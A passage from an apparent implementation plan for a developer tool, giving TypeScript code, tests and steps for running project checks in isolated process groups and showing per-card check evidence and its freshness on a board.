/** A check's environment, from the desk's: only the names in `ENVIRONMENT`. */
export const checkEnvironment = (from: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv => {
  const env: NodeJS.ProcessEnv = { TERM: 'dumb' }
  for (const name of ENVIRONMENT) {
    const value = from[name]
    if (value !== undefined) env[name] = value
  }
  return env
}

/** How long a check's own output may stay open after its shell has exited — a child holding the pipe. */
const AFTER_EXIT_MS = 1_000

export interface CommandRun {
  /** Its exit status; null when it did not exit by itself — it ran over its time, was stopped, or never started. */
  readonly exit: number | null
  readonly timedOut: boolean
  /** The last of what it printed, both streams in the order they arrived, or why it never started. */
  readonly tail: string
}

/** Colour and cursor codes, and every other control character but line feeds and tabs. */
const plain = (text: string): string =>
  text.replace(/\x1b\[[0-9;?]*[ -/]*[@-~]/g, '').replace(/[\x00-\x08\x0b-\x1f\x7f]/g, '')

const stopGroup = (child: ChildProcess): void => {
  try {
    // A negative pid is the group: the shell and every process still in it.
    if (child.pid !== undefined) process.kill(-child.pid, 'SIGKILL')
  } catch {
    // Already gone.
  }
}

export const runCommand = (
  command: string,
  where: {
    readonly cwd: string
    readonly timeoutSec: number
    /** Stops it now, with its process group — the desk is closing. Already aborted, it never starts. */
    readonly signal?: AbortSignal
  },
): Promise<CommandRun> =>
  new Promise((resolve) => {
    if (where.signal?.aborted) {
      resolve({ exit: null, timedOut: false, tail: 'It was stopped: the desk closed.' })
      return
    }
    let printed = ''
    let settled = false
    let timedOut = false
    let afterExit: ReturnType<typeof setTimeout> | null = null
    const child = spawn(command, {
      cwd: where.cwd,
      shell: true,
      detached: true,
      env: checkEnvironment(),
      stdio: ['ignore', 'pipe', 'pipe'],
    })
    const finish = (exit: number | null, said?: string): void => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      if (afterExit) clearTimeout(afterExit)
      const text = plain(printed)
      const joined = said ? `${text}${text === '' || text.endsWith('\n') ? '' : '\n'}${said}` : text
      resolve({ exit, timedOut, tail: joined.slice(-TAIL_LIMIT) })
    }
    const keep = (chunk: Buffer): void => {
      printed = (printed + chunk.toString('utf8')).slice(-TAIL_LIMIT * 4)
    }
    const timer = setTimeout(() => {
      timedOut = true
      stopGroup(child)
      finish(null, `It ran past ${where.timeoutSec}s and was stopped.`)
    }, where.timeoutSec * 1000)
    // A check left running cannot hold a quit open; the kill above is what ends it.
    timer.unref?.()
    const stop = (): void => {
      stopGroup(child)
      finish(null, 'It was stopped: the desk closed.')
    }
    where.signal?.addEventListener('abort', stop, { once: true })
    child.stdout?.on('data', keep)
    child.stderr?.on('data', keep)
    child.on('error', (error) => finish(null, `It did not start: ${error.message}`))
    child.on('exit', (code, killedBy) => {
      const exit = killedBy ? null : code
      // The streams close after the shell exits; a child still holding them is ended, not waited for.
      afterExit = setTimeout(() => {
        stopGroup(child)
        finish(exit)
      }, AFTER_EXIT_MS)
      afterExit.unref?.()
      child.on('close', () => finish(exit))
    })
  })
```

- [ ] **Step 4: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-run.test.js`
Expected: PASS — 10 tests, in about four seconds.

- [ ] **Step 5: Prove the tests can fail**

1. In the timeout handler, delete `stopGroup(child)`: `a command that runs past its time is stopped, with everything it started` fails on `the child it started went with it`. Restore it.
2. In `stop`, delete `stopGroup(child)`: `a check the desk stops is stopped at once, with everything it started` fails. Restore it.
3. Replace the `plain(printed)` call in `finish` with `printed`: `only the last of a long output is kept, and without its colour codes` fails on the coloured sentinel printed inside the retained tail. Restore it.
4. Spawn with `env: process.env` in place of `env: checkEnvironment()`: `the command itself sees only that environment: a secret in the desk's is not there` fails. Restore it.
5. Delete the `if (where.signal?.aborted) { … }` guard at the top: `a check asked to start after the desk has begun closing never starts` fails — the command runs and makes its file. Restore it.

`a process that leaves the group is not stopped with it` is the documented limit, pinned so it is never mistaken for a promise; it cleans up the process it proves escaped.

`gone` waits up to two seconds for a killed process to be reaped: until the system reaps it, a signal 0 still finds it, and a check made at once was flaky under a loaded full suite.

- [ ] **Step 6: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/run.ts packages/server/test/evidence-run.test.ts
git commit -m "feat(evidence): a runner that keeps the end of what a check printed

A check runs through a shell in its own process group and answers with its
status, or that it ran past its time, or why it never started — with the last
4,000 characters it printed, colour codes stripped, so a failure can say why.
It runs with the person's authority, in an environment built from a short
list of names, so none of the desk's variables or tokens reach it. A timeout
or a quit stops its process group — the group and nothing wider, which a test
pins — and a child left holding the output does not hold the check open.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 10: A board's evidence

> **Reads `.harnessdesk/checks.yml`** — for the names of the checks a card may offer and the reason the file refuses any other — **and never a command**: nothing here compares or runs one. Whether a command was seen, and asking again when it changes, is Task 8's and Task 11's, and tested there.

A card carries the latest fact of each kind — each named check apart — and how each stands now against its branch: fresh, some commits behind, rewritten since, run on uncommitted changes, final (a merged pull request whose branch is gone — `freshnessOf` is asked with `merged` only for a merged pull request's fact), or unknown with why. `evidence/board` reads a room's evidence whole — with the checks its project names, and each one the file refuses with why, so a card can offer it greyed rather than hide it — and `evidence/changed` pushes it whole whenever it moves, the way `flow/changed` pushes a room's runs. Nothing here writes: a board's evidence is read from its project's store, which only the desk writes, from something it did. So a message in the channel — an agent telling another the tests pass — puts nothing on a card, and this task's tests say so.

**What a backup brought is history.** A fact a restore added (`restored`, Task 14) is drawn, and stands as `unknown` — `RESTORED_WHY`, *it came from a backup, and this desk has not observed it* — so it never makes a card *Ready*. A fact this desk observed always answers its question first, whatever time the restored one claims; and the same question observed again here answers it from then on.

**Every read is stamped.** `BoardEvidence.stamp` is when the read began, in host milliseconds, and strictly later than the read before (`#nextStamp`), so a window that receives a slow poll after a newer push can tell which is newer and keep it (Task 15). A host restarted with its clock set back would stamp lower for as long as the clock is behind; a window drops those reads until it catches up, and the next push or poll after that is kept.

**One check on a card at a time.** `RunningChecks` is keyed by room and card, not by check name: two checks in one checkout at once would each be measuring the other's work, and a check renamed while its first run continues is still the same checkout. `start` answers the name already running there, which Task 11's refusal says.

**Files:**
- Create: `packages/server/src/evidence/board.ts`
- Modify: `packages/protocol/src/evidence.ts` (`EvidenceView`, `CardEvidence`, `BoardEvidence`)
- Modify: `packages/server/src/evidence/plane.ts` (`running`, `board`, `announce`)
- Modify: `packages/server/src/methods/evidence.ts`, `packages/protocol/src/wire.ts` (`evidence/board`, `evidence/changed`), `packages/protocol/src/wire-validators.ts`, `script/check-reachable.mjs` (pin it)
- Test: `packages/server/test/evidence-board.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `factKey` (Task 2); `freshnessOf`, `projectOf` (Task 3); `SeatBook.byId` (Task 4); `readChecks` (Task 7); `host.teamPlane.claim`, `host.teamPlane.send` and the verbs `team/room/create`, `team/room/join`, `team/add`, `team/state` (existing).
- Produces: in `@harnessdesk/protocol`, `interface EvidenceView { record: EvidenceRecord; freshness: Freshness; by: { agent: string | null; seat: string } | null }`, `interface CardEvidence { card: number; facts: readonly EvidenceView[]; running: readonly { name: string; since: number }[] }`, `interface BoardEvidence { room: string; stamp: number; checks: readonly string[]; refused: readonly { name: string; why: string }[]; unreadable: string | null; cards: readonly CardEvidence[] }`. From `board.ts`: `RESTORED_WHY`; `class RunningChecks { start(room, card, name, since): { name: string } | null; end(room, card): void; of(room): { card; name; since }[] }` — `start` answers what is already running on the card, or null when it took the card; `interface BoardEvidenceInput` (with `stamp`); `boardEvidence(input: BoardEvidenceInput): Promise<BoardEvidence>`. `EvidencePlane.running: RunningChecks`; `EvidencePlane.board(room: string): Promise<BoardEvidence>`; `EvidencePlane.announce(room: string): void`. Wire: `'evidence/board': { params: { room: string }; result: BoardEvidence }` and the notification `{ method: 'evidence/changed'; params: { room: string; evidence: BoardEvidence } }`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-board.test.ts`:

```ts
import assert from 'node:assert/strict'
import { mkdir, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import {
  parseClientMessage,
  runtimeId,
  ValidationError,
  type BoardEvidence,
  type EvidenceRecord,
  type Session,
  type TeamState,
  type WireNotification,
} from '@harnessdesk/protocol'

import { boardEvidence, RESTORED_WHY, RunningChecks } from '../src/evidence/board.js'
import { EvidencePlane } from '../src/evidence/plane.js'
import { canonical } from '../src/evidence/revision.js'
import { EvidenceStore } from '../src/evidence/store.js'
import { evidenceDesk, makeRepo, until, writeAgent } from './fixtures/evidence-desk.js'

/*
 * A board's evidence: the latest fact of each kind per card, each named check
 * apart, and how each stands against its branch now. Stale is said, with how
 * far behind; unknown says why; nothing is green because it once was.
 */

const check = (over: {
  readonly id: string
  readonly at: string
  readonly cwd: string
  readonly observedAt: number
  readonly name?: string
  readonly exit?: number
  readonly card?: number
  readonly board?: string
  readonly seat?: string | null
  readonly withCheckout?: boolean
  readonly restored?: boolean
}): EvidenceRecord => ({
  id: over.id,
  fact: {
    kind: 'check',
    name: over.name ?? 'verify',
    run: 'pnpm verify',
    exit: over.exit ?? 0,
    timedOut: false,
    at: over.at,
    dirty: false,
    tail: '',
  },
  card: { board: over.board ?? 'room-1', id: over.card ?? 3 },
  checkout: over.withCheckout === false ? null : { cwd: over.cwd, branch: 'main' },
  seat: over.seat ?? null,
  round: null,
  observedAt: over.observedAt,
  posted: null,
  ...(over.restored ? { restored: { at: 1 } } : {}),
})

test('a card carries the latest fact of each kind, each named check apart, and how each stands now', async () => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const at = await repo.git('rev-parse', 'HEAD')
  const records = [
    check({ id: 'failed-first', at, cwd: repo.dir, observedAt: 1, exit: 1 }),
    check({ id: 'passed-later', at, cwd: repo.dir, observedAt: 2, seat: 'seat-1' }),
    check({ id: 'lint', at, cwd: repo.dir, observedAt: 3, name: 'lint' }),
    check({ id: 'another-room', at, cwd: repo.dir, observedAt: 4, board: 'room-2' }),
  ]
  const read = (): Promise<BoardEvidence> =>
    boardEvidence({
      room: 'room-1',
      stamp: 1,
      project,
      records,
      checks: ['verify', 'lint'],
      refused: [],
      unreadable: null,
      running: [],
      seatWords: (id) => (id === 'seat-1' ? { agent: 'Scout', seat: 'Fake Runtime' } : null),
    })

  const now = await read()
  assert.deepEqual(now.checks, ['verify', 'lint'])
  assert.deepEqual(
    now.cards.map((card) => [card.card, card.facts.map((fact) => [fact.record.id, fact.freshness.state, fact.by])]),
    [[3, [['lint', 'fresh', null], ['passed-later', 'fresh', { agent: 'Scout', seat: 'Fake Runtime' }]]]],
  )

  // A commit lands on the branch: every fact bound to the old head is stale, and says by how much.
  await writeFile(join(repo.dir, 'README.md'), 'changed\n')
  await repo.git('commit', '-q', '-am', 'more')
  const later = await read()
  assert.deepEqual(
    later.cards[0]?.facts.map((fact) => fact.freshness),
    [
      { state: 'behind', commits: 1 },
      { state: 'behind', commits: 1 },
    ],
  )
})

test('a fact with nowhere recorded is unknown, and a check running for a card is listed even before it has a fact', async () => {
  const repo = await makeRepo()
  const at = await repo.git('rev-parse', 'HEAD')
  const running = new RunningChecks()
  assert.equal(running.start('room-1', 7, 'verify', 50), null)
  // One check on a card at a time, whatever its name: two in one checkout would each measure the other's work.
  assert.deepEqual(running.start('room-1', 7, 'verify', 60), { name: 'verify' })
  assert.deepEqual(running.start('room-1', 7, 'lint', 60), { name: 'verify' })
  assert.equal(running.start('room-1', 8, 'lint', 60), null, 'another card is another checkout')
  running.end('room-1', 8)
  const board = await boardEvidence({
    room: 'room-1',
    stamp: 1,
    project: await canonical(repo.dir),
    records: [check({ id: 'nowhere', at, cwd: repo.dir, observedAt: 1, withCheckout: false })],
    checks: [],
    refused: [],
    unreadable: null,
    running: running.of('room-1'),
    seatWords: () => null,
  })
  assert.deepEqual(
    board.cards.map((card) => [card.card, card.facts.map((fact) => fact.freshness), card.running]),
    [
      [3, [{ state: 'unknown', why: 'where it was observed is not recorded' }], []],
      [7, [], [{ name: 'verify', since: 50 }]],
    ],
  )
  running.end('room-1', 7)
  assert.deepEqual(running.of('room-1'), [])
})

test("through the host: a room's evidence is read from its project's store, with the checks the project names", async (t) => {
  const { host, stateDir, repo } = await evidenceDesk(t)
  await mkdir(join(repo.dir, '.harnessdesk'))
  await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), 'verify: { run: pnpm verify }\nodd: { run: pnpm odd, cwd: x }\n')
  await repo.git('add', '.harnessdesk')
  await repo.git('commit', '-q', '-m', 'checks')
  const room = (await host.call('team/room/create', { root: repo.dir, name: 'Checks' })) as TeamState
  const at = await repo.git('rev-parse', 'HEAD')
  await new EvidenceStore(join(stateDir, 'evidence')).append(await canonical(repo.dir), 'evidence', [
    { type: 'evidence', record: check({ id: 'f1', at, cwd: repo.dir, observedAt: 1, board: room.id, card: 1 }) },
  ])

  const board = (await host.call('evidence/board', { room: room.id })) as BoardEvidence
  assert.deepEqual(board.checks, ['verify'])
  // A check the file refuses is named, with why, so a card can offer it greyed rather than hide it.
  assert.deepEqual(board.refused.map((one) => one.name), ['odd'])
  assert.match(board.refused[0]?.why ?? '', /says only `run` and `timeout`/)
  assert.equal(board.unreadable, null)
  assert.deepEqual(board.cards.map((card) => [card.card, card.facts.map((fact) => fact.freshness.state)]), [[1, ['fresh']]])

  // What runs is what is committed: a change in the working copy changes nothing until it is.
  await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), 'verify: { run: pnpm verify }\nlint: { run: pnpm lint }\n')
  assert.deepEqual(((await host.call('evidence/board', { room: room.id })) as BoardEvidence).checks, ['verify'])

  // A file that does not parse leaves nothing to run, and says why.
  await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), 'verify: { run: pnpm verify\n')
  await repo.git('commit', '-q', '-am', 'broken checks')
  const unreadable = (await host.call('evidence/board', { room: room.id })) as BoardEvidence
  assert.deepEqual([unreadable.checks, unreadable.refused], [[], []])
  assert.match(unreadable.unreadable ?? '', /^It does not parse: /)
  await assert.rejects(host.call('evidence/board', { room: 'no-such-room' }), /^Error: There is no room no-such-room on this desk\.$/)
})

test("every window is told a room's evidence, whole, when it moves", async () => {
  const repo = await makeRepo()
  const heard: WireNotification[] = []
  const plane = new EvidencePlane(
    // A clock that never moves: every stamp still has to be later than the last.
    { dir: join(repo.dir, '..', 'evidence-announce'), seenFile: join(repo.dir, '..', 'seen-announce.json'), now: () => 1_000 },
    {
      board: (room) => (room === 'room-1' ? ({ id: 'room-1', root: repo.dir, intents: [] } as unknown as TeamState) : null),
      cwdOf: () => null,
      push: (notification) => void heard.push(notification),
      log: () => {},
    },
  )
  plane.announce('room-1')
  const told = await until(() => heard.find((one) => one.method === 'evidence/changed') ?? null, 'the evidence/changed notice')
  const stamp = told.params.room === 'room-1' ? told.params.evidence.stamp : 0
  assert.deepEqual(told.params, {
    room: 'room-1',
    evidence: { room: 'room-1', stamp, checks: [], refused: [], unreadable: null, cards: [] },
  })
  // Every read is stamped later than the one before, so a window keeps the latest and drops a late answer.
  const [first, second] = await Promise.all([plane.board('room-1'), plane.board('room-1')])
  assert.deepEqual([stamp, first.stamp, second.stamp], [1_000, 1_001, 1_002])
})

test('a fact a backup brought stands as unknown, and whatever this desk observed of the same question answers it', async () => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const at = await repo.git('rev-parse', 'HEAD')
  const read = (records: readonly EvidenceRecord[]): Promise<BoardEvidence> =>
    boardEvidence({ room: 'room-1', stamp: 1, project, records, checks: [], refused: [], unreadable: null, running: [], seatWords: () => null })

  // Only a backup's word for it: drawn, as unknown, and why.
  const restored = check({ id: 'restored', at, cwd: repo.dir, observedAt: 1, restored: true })
  const alone = await read([restored])
  assert.deepEqual(
    alone.cards[0]?.facts.map((fact) => [fact.record.id, fact.freshness]),
    [['restored', { state: 'unknown', why: RESTORED_WHY }]],
  )
  // Observed here, earlier than the backup claims its own was: what this desk saw still answers.
  const kept = check({ id: 'kept', at, cwd: repo.dir, observedAt: 1, exit: 1 })
  const future = check({ id: 'from-the-future', at, cwd: repo.dir, observedAt: Number.MAX_SAFE_INTEGER, restored: true })
  const both = await read([kept, future])
  assert.deepEqual(both.cards[0]?.facts.map((fact) => [fact.record.id, fact.freshness.state]), [['kept', 'fresh']])
  // And observed again after it came: the new observation answers.
  const again = await read([restored, check({ id: 'observed-again', at, cwd: repo.dir, observedAt: 2 })])
  assert.deepEqual(again.cards[0]?.facts.map((fact) => fact.record.id), ['observed-again'])
})

test('only a merged pull request can be final; any other fact on a gone branch is unknown', async () => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  await repo.git('checkout', '-q', '-b', 'work')
  const head = await repo.git('rev-parse', 'HEAD')
  await repo.git('checkout', '-q', 'main')
  await repo.git('branch', '-q', '-D', 'work')
  const pr = (id: string, state: 'open' | 'merged', card: number): EvidenceRecord => ({
    id,
    fact: { kind: 'pr', number: card, head, state, url: null },
    card: { board: 'room-1', id: card },
    checkout: { cwd: repo.dir, branch: 'work' },
    observedAt: 1,
  })
  const board = await boardEvidence({
    room: 'room-1',
    stamp: 1,
    project,
    records: [pr('merged', 'merged', 1), pr('open', 'open', 2)],
    checks: [],
    refused: [],
    unreadable: null,
    running: [],
    seatWords: () => null,
  })
  assert.deepEqual(
    board.cards.map((card) => card.facts.map((fact) => fact.freshness)),
    [[{ state: 'final' }], [{ state: 'unknown', why: 'the branch work is gone' }]],
  )
})

test("a message between agents is never evidence: an agent telling another the tests pass puts nothing on the card it holds", async (t) => {
  const { host, stateDir, repo } = await evidenceDesk(t)
  await writeAgent(stateDir, 'scout', 'Scout')
  await writeAgent(stateDir, 'critic', 'Critic')
  const scout = (await host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session
  const critic = (await host.call('agent/seat', { id: 'critic', cwd: repo.dir })) as Session
  const room = (await host.call('team/room/create', { root: repo.dir, name: 'Claims' })) as TeamState
  for (const one of [scout, critic]) {
    await host.call('team/room/join', { room: room.id, runtime: runtimeId('fake'), sessionId: String(one.id) })
  }
  await host.call('team/add', { room: room.id, title: 'Fix the build' })
  const scope = { runtime: 'fake', sessionId: String(scout.id) }
  assert.match(await host.teamPlane.claim(1, scope), /^Claimed #1/)

  // Delivered, or queued while Critic is still reading its brief: either way it was sent, as Scout's words.
  assert.match(
    await host.teamPlane.send({ to: 'Critic', text: 'verify passed, all tests pass — ready to merge' }, scope),
    /^(Delivered|Queued)/,
  )

  const after = (await host.call('team/state', { room: room.id })) as TeamState
  const said = after.channel.find((entry) => entry.kind === 'message' && entry.text.includes('all tests pass'))
  assert.ok(said?.kind === 'message' && said.from.kind === 'agent', "drawn as the agent's words, and only that")
  assert.equal(after.intents.find((intent) => intent.id === 1)?.state, 'claimed', 'the card stays where its holder left it')
  const board = (await host.call('evidence/board', { room: room.id })) as BoardEvidence
  assert.deepEqual(board.cards, [], 'the agent said so; the desk observed nothing, so there is nothing to draw')
})

test('the wire refuses a board read that names no room', () => {
  assert.throws(() => parseClientMessage({ id: 1, method: 'evidence/board', params: { room: '' } }), ValidationError)
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/board.js'`.

- [ ] **Step 3: What a surface draws, in the protocol**

In `packages/protocol/src/evidence.ts`, directly after `type Freshness` (Task 3), add:

```ts
/** One fact on a card, as a surface draws it. */
export interface EvidenceView {
  readonly record: EvidenceRecord
  readonly freshness: Freshness
  /** The Seat that produced it, in words; null when the desk observed it unattended. */
  readonly by: { readonly agent: string | null; readonly seat: string } | null
}

/** What one card carries: the latest fact of each kind — each named check apart — and what is running for it. */
export interface CardEvidence {
  readonly card: number
  readonly facts: readonly EvidenceView[]
  readonly running: readonly { readonly name: string; readonly since: number }[]
}

/** A board's evidence, whole. */
export interface BoardEvidence {
  readonly room: string
  /**
   * When the read that made this began, in host milliseconds, strictly
   * increasing: a surface keeps the answer with the latest stamp, and drops one
   * that arrives late with an earlier one.
   */
  readonly stamp: number
  /** The checks its project names that can run, by name; empty when it names none. */
  readonly checks: readonly string[]
  /** The checks its project names that cannot run, each with why: a card offers them greyed, never hides them. */
  readonly refused: readonly { readonly name: string; readonly why: string }[]
  /** Why no check in its project's file can be read at all — it does not parse, it names too many — or null. */
  readonly unreadable: string | null
  /** Only the cards that carry anything. */
  readonly cards: readonly CardEvidence[]
}
```

- [ ] **Step 4: A board's evidence, read**

Create `packages/server/src/evidence/board.ts`:

```ts
import type {
  BoardEvidence,
  CardEvidence,
  EvidenceRecord,
  EvidenceView,
  Freshness,
  SeatId,
  Sha,
} from '@harnessdesk/protocol'

import { factKey } from './records.js'
import { freshnessOf } from './revision.js'

/**
 * A board's evidence, as a surface draws it: the latest fact of each kind on
 * each card — each named check apart — and how each stands now against its
 * branch. Read, never written: every fact here was recorded by the desk from
 * something it did.
 *
 * A fact a backup brought is history. A fact this desk observed always answers
 * its question first, whenever the restored one says it was observed; and a
 * restored fact that is still the only answer stands as unknown, because this
 * desk has not seen it — it is drawn, and it never makes a card *Ready*.
 */

/** Why a restored fact stands as unknown. */
export const RESTORED_WHY = 'it came from a backup, and this desk has not observed it'

/**
 * The named check running on each card now. One at a time on a card, whatever
 * its name: two checks in one checkout at once would each be measuring the
 * other's work. In memory: a run does not outlive the desk that started it.
 */
export class RunningChecks {
  readonly #runs = new Map<string, { readonly room: string; readonly card: number; readonly name: string; readonly since: number }>()

  /** Marks a check running on a card, or answers the one already running there. */
  start(room: string, card: number, name: string, since: number): { readonly name: string } | null {
    const key = JSON.stringify([room, card])
    const running = this.#runs.get(key)
    if (running) return { name: running.name }
    this.#runs.set(key, { room, card, name, since })
    return null
  }

  end(room: string, card: number): void {
    this.#runs.delete(JSON.stringify([room, card]))
  }

  of(room: string): { readonly card: number; readonly name: string; readonly since: number }[] {
    return [...this.#runs.values()].filter((run) => run.room === room)
  }
}

/** The revision a fact is bound to, or null for one bound to none (`spend`). */
const boundTo = (record: EvidenceRecord): Sha | null => {
  const fact = record.fact
  switch (fact.kind) {
    case 'check':
    case 'ci':
    case 'review':
    case 'finding':
      return fact.at
    case 'pr':
      return fact.head
    case 'diff':
      return fact.to
    case 'spend':
      return null
  }
}

/** The order a card's facts are listed in: its checks by name, then what the forge says, then the diff. */
const rank = (record: EvidenceRecord): string => {
  const order = ['check', 'ci', 'pr', 'diff', 'review', 'finding', 'spend']
  return `${order.indexOf(record.fact.kind)}:${record.fact.kind === 'check' ? record.fact.name : ''}`
}

/** Whether `record` answers its question over `before`: what this desk observed first, then the later one. */
const supersedes = (record: EvidenceRecord, before: EvidenceRecord): boolean => {
  const kept = !record.restored
  if (kept !== !before.restored) return kept
  // The latest observation of a question answers it; a tie goes to the one written later.
  return record.observedAt >= before.observedAt
}

export interface BoardEvidenceInput {
  readonly room: string
  /** When the read that makes this began: `BoardEvidence.stamp`. */
  readonly stamp: number
  /** The project the room's records are kept under. */
  readonly project: string
  /** Every fact the project's store holds, in the order written. */
  readonly records: readonly EvidenceRecord[]
  /** The names of the checks the project names that can run. */
  readonly checks: readonly string[]
  /** The checks it names that cannot run, with why. */
  readonly refused: readonly { readonly name: string; readonly why: string }[]
  /** Why its checks file cannot be read at all, or null. */
  readonly unreadable: string | null
  readonly running: readonly { readonly card: number; readonly name: string; readonly since: number }[]
  /** A Seat in words, or null when the desk knows no such Seat. */
  readonly seatWords: (id: SeatId) => { readonly agent: string | null; readonly seat: string } | null
}

export const boardEvidence = async (input: BoardEvidenceInput): Promise<BoardEvidence> => {
  const latest = new Map<number, Map<string, EvidenceRecord>>()
  for (const record of input.records) {
    if (!record.card || record.card.board !== input.room) continue
    const card = latest.get(record.card.id) ?? new Map<string, EvidenceRecord>()
    const key = factKey(record.fact)
    const before = card.get(key)
    if (!before || supersedes(record, before)) card.set(key, record)
    latest.set(record.card.id, card)
  }

  // One read of git per checkout, branch, revision and kind of question, however many cards share them.
  const standing = new Map<string, Promise<Freshness>>()
  const freshness = (record: EvidenceRecord): Promise<Freshness> => {
    if (record.restored) return Promise.resolve({ state: 'unknown', why: RESTORED_WHY })
    const at = boundTo(record)
    if (at === null) return Promise.resolve({ state: 'fresh' })
    if (!record.checkout) return Promise.resolve({ state: 'unknown', why: 'where it was observed is not recorded' })
    const dirty = record.fact.kind === 'check' && record.fact.dirty
    const merged = record.fact.kind === 'pr' && record.fact.state === 'merged'
    const key = JSON.stringify([record.checkout.cwd, record.checkout.branch, at, dirty, merged])
    const known = standing.get(key)
    if (known) return known
    const reading = freshnessOf(record.checkout, at, { dirty, merged, project: input.project })
    standing.set(key, reading)
    return reading
  }

  const cards: CardEvidence[] = []
  const ids = new Set([...latest.keys(), ...input.running.map((run) => run.card)])
  for (const id of [...ids].sort((a, b) => a - b)) {
    const records = [...(latest.get(id)?.values() ?? [])].sort((a, b) => rank(a).localeCompare(rank(b)))
    const facts: EvidenceView[] = []
    for (const record of records) {
      facts.push({
        record,
        freshness: await freshness(record),
        by: record.seat ? input.seatWords(record.seat) : null,
      })
    }
    cards.push({
      card: id,
      facts,
      running: input.running
        .filter((run) => run.card === id)
        .map((run) => ({ name: run.name, since: run.since }))
        .sort((a, b) => a.name.localeCompare(b.name)),
    })
  }
  return {
    room: input.room,
    stamp: input.stamp,
    checks: [...input.checks],
    refused: [...input.refused],
    unreadable: input.unreadable,
    cards,
  }
}
```

- [ ] **Step 5: The plane reads a room, and tells every window when it moves**

In `packages/server/src/evidence/plane.ts`:

1. Add `BoardEvidence,` to the type import from `@harnessdesk/protocol` (which then names `BoardEvidence, ProjectChecks, TeamState, WireNotification`), and directly above `import { readChecks } from './checks-file.js'` add:

```ts
import { boardEvidence, RunningChecks } from './board.js'
```

2. In the class, after `readonly seen: CommandsSeen`, add:

```ts
  /** Named checks running now, by room and card. */
  readonly running = new RunningChecks()
```

   and after `readonly #now: () => number`:

```ts
  /** The last stamp a board read took: each is later than the one before, whatever the clock does. */
  #lastStamp = 0
```

3. Add above `close()`:

```ts
  /**
   * A room's evidence, read now: its project's facts for the room's cards, each
   * against its branch as it stands. Refuses a room the desk does not have.
   */
  async board(room: string): Promise<BoardEvidence> {
    // Taken first, so a read that began later always carries the later stamp.
    const stamp = this.#nextStamp()
    const board = this.#port.board(room)
    if (!board) throw new Error(`There is no room ${room} on this desk.`)
    const project = await projectOf(board.cwd ?? board.root)
    const { lines } = await this.store.read(project, 'evidence')
    const checks = await readChecks(project)
    const records = lines.flatMap((line) => (line.type === 'evidence' ? [line.record] : []))
    // One reason per check the file refuses — its first — and the file's own, when nothing in it can be read.
    const refused = new Map<string, string>()
    for (const problem of checks.problems) {
      if (problem.check !== undefined && !refused.has(problem.check)) refused.set(problem.check, problem.text)
    }
    return boardEvidence({
      room,
      stamp,
      project,
      records,
      checks: checks.checks.map((check) => check.name),
      refused: [...refused].map(([name, why]) => ({ name, why })),
      unreadable: checks.problems.find((problem) => problem.check === undefined)?.text ?? null,
      running: this.running.of(room),
      seatWords: (id) => {
        const seat = this.seats.byId(id)
        return seat ? { agent: seat.agent?.name ?? null, seat: seat.seatLabel } : null
      },
    })
  }

  /** Tells every window a room's evidence moved. Never throws: a fact is kept whether or not a window hears of it. */
  announce(room: string): void {
    void this.board(room).then(
      (evidence) => this.#port.push({ method: 'evidence/changed', params: { room, evidence } }),
      (error: unknown) =>
        this.#port.log("a room's evidence could not be read to tell the windows", {
          room,
          error: error instanceof Error ? error.message : String(error),
        }),
    )
  }

  /** A board read's stamp: now, and always later than the last one. */
  #nextStamp(): number {
    this.#lastStamp = Math.max(this.#now(), this.#lastStamp + 1)
    return this.#lastStamp
  }
```

- [ ] **Step 6: The verb and the notice, on the wire**

1. In `packages/protocol/src/wire.ts`, change the evidence import to `import type { BoardEvidence, ProjectChecks, SeatRecord } from './evidence.js'`. After the `'evidence/checks'` entry add:

```ts
  /**
   * A room's evidence: for each card that carries any, the latest fact of each
   * kind the desk observed — each named check apart — and how it stands now
   * against its branch, with the Seat that produced it in words; the named
   * checks running for it; and the checks its project names. Read on demand;
   * every change after is pushed whole, as `evidence/changed`.
   */
  'evidence/board': {
    params: { readonly room: string }
    result: BoardEvidence
  }
```

   In the `WireNotification` union, directly after the `'flow/changed'` member, add:

```ts
  | {
      /**
       * One room's evidence, whole — sent when the desk records a fact for one
       * of its cards, and when a named check starts or ends — for the reason
       * the board is sent whole: a new fact can move a card to another column.
       */
      readonly method: 'evidence/changed'
      readonly params: { readonly room: string; readonly evidence: BoardEvidence }
    }
```

2. In `packages/protocol/src/wire-validators.ts`, after `'evidence/checks': …,` add `'evidence/board': shape({ room: isFilled }),`.
3. In `packages/server/src/methods/evidence.ts`, after the `'evidence/seat'` handler, add:

```ts

  'evidence/board': (ctx, params) => ctx.evidence.board(params.room),
```

4. In `script/check-reachable.mjs`, add to `UNREACHED`:

```js
  'evidence/board': "a room's board draws its cards' evidence, in the second half of the evidence phase",
```

- [ ] **Step 7: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-board.test.js packages/server/dist/test/evidence-project-checks.test.js`
Expected: PASS — 8 and 3 tests.

- [ ] **Step 8: Prove the tests can fail**

1. In `supersedes`, change `return record.observedAt >= before.observedAt` to `return false`: `a card carries the latest fact of each kind, each named check apart, and how each stands now` fails — the failed first run stands in for the later pass. Restore it.
2. Change the `if (!record.checkout)` line in `freshness` to `if (!record.checkout) return Promise.resolve({ state: 'fresh' })`: `a fact with nowhere recorded is unknown…` fails. Restore it.
